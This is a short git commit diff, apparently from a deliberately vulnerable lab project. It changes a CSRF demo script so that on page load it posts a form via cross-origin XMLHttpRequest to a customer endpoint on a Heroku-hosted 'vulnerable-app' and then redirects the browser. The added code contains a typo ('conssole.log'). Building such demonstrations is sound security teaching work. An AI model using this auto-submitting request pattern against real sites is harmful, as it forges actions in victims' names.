9d76368603dcd46420fbf3e1e73368c04afa25c1
kotonekurita <kotone.kurita@di-v.co.jp>
2021-03-12 18:17:11 +0900

    fix

--- docs/csrf.js
+++ docs/csrf.js
@@ -2,5 +2,16 @@ window.addEventListener("DOMContentLoaded", () => {
 	// const iframe = document.getElementById("csrf-iframe");
   // const form = iframe.contentWindow.document.querySelector('#csrf-form');
   const form = document.querySelector('#csrf-form');
-  form.submit()
+
+  const formData = new FormData(document.getElementById("csrf-form"));
+  const XHR = new XMLHttpRequest();
+    XHR.open("POST", "https://vulnerable-app1.herokuapp.com/customers/4", true);
+    XHR.responseType = "json";
+    XHR.send(formData);
+    XHR.onload = () => {
+      conssole.log("ok")
+      location.href="https://kotonekurita.github.io/VulnerableApp/"
+      return null
+    }
+  // form.submit()
 })
